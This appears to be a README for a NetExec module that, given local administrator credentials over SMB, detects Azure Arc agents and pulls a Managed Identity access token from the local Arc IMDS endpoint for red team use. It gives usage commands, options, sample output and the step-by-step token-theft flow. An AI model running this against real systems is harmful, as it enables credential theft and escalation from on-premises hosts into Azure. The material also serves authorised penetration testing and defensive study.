# NetExec Module: `azurearc`

Enumerates Azure Arc presence on Windows targets and, when present, retrieves a **Managed Identity access token** from the local Arc IMDS endpoint using the documented **401 challenge → `.key` file → second request** flow.

- **Protocol:** SMB (requires local administrator privileges)
- **Primary use case:** Rapidly map Arc deployment and obtain a cloud-scoped token for Azure control-plane enumeration during red team engagements.

---

## ✨ Features

- **Presence check** (`CHECK=true`): Detects Arc agent by listing well-known install paths.
- **Token retrieval** (default): Executes the IMDS challenge/response locally on the target and returns JSON containing `access_token`.

---

## ⚙️ Usage

```bash
# Presence check only
nxc smb <TARGET> -u <USER> -p '<PASS>' -M azurearc -o CHECK=true

# Dump token (default behavior if Arc is present)
nxc smb <TARGET> -u <USER> -p '<PASS>' -M azurearc
Module Options (-o KEY=VALUE)
Option	Type	Default	Description
CHECK	bool	false	Only verify whether the Arc agent is installed.
RESOURCE	string	https://management.azure.com	AAD resource audience for the token.
API_VERSION	string	2021-02-01	Arc IMDS API version.
VERBOSE	bool	false	Write diagnostic details (status, key path, body excerpts) to OUTFILE.
OUTFILE	string	C:\Windows\Temp\azurearc_out.txt	Target-side capture path for JSON/diagnostics (deleted after read-back).

🖥️ Output Examples
Presence check (installed)

nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc -o CHECK=true
[+] Azure Arc agent appears to be installed
Presence check (not installed)

nxc smb 192.168.1.101 -u USER -p 'PASS' -M azurearc -o CHECK=true
[-] Azure Arc agent not found
Token dump (success)

nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
[*] Attempting to retrieve Azure Arc Managed Identity access token
[+] Managed Identity token retrieved
{
  "access_token": "eyJhbGciOi...<redacted>...",
  "expires_on": "1730812345",
  "token_type": "Bearer",
  "resource": "https://management.azure.com"
}


🔍 How It Works (Behavior)
Presence check via SMB listing:
C:\Program Files\AzureConnectedMachineAgent\*
C:\Program Files (x86)\AzureConnectedMachineAgent\*

Token retrieval on target (PowerShell):
1.GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...
→ expect 401 with WWW-Authenticate: Basic realm="<path to .key>"
Read the .key contents (requires local admin).
2.Second GET with Authorization: Basic <key> to obtain token JSON.
Write JSON to OUTFILE, fetch via SMB, and delete the file.

📸 Screenshots
Presence check + token retrieval (redacted)
<img width="1201" height="450" alt="Azure Arc presence check and token retrieval" src="https://github.com/user-attachments/assets/8b824c35-7595-43f1-90f1-627bb9962712" />

Verbose diagnostics enabled
<img width="1189" height="391" alt="Verbose diagnostics and returned token JSON (redacted)" src="https://github.com/user-attachments/assets/b25305f9-1946-4e6c-8c9f-028e0bded0ff" />

🔒 OPSEC & Scope Notes
Local admin required on the target (matches Arc’s security boundary).
Tokens are written to a temp file on the target only long enough to read back via SMB. the file is then deleted.
Be mindful of token lifetime and endpoint logging.



🧭 References
NSIDE Attack Logic  Azure Arc - Part 1 - Escalation from On-Premises to Cloud
https://www.nsideattacklogic.de/azure-arc-part-1-escalation-from-on-premises-to-cloud/

Microsoft Docs — Managed identity on Arc-enabled servers
https://learn.microsoft.com/azure/azure-arc/servers/managed-identity-authentication

::contentReference[oaicite:0]{index=0}
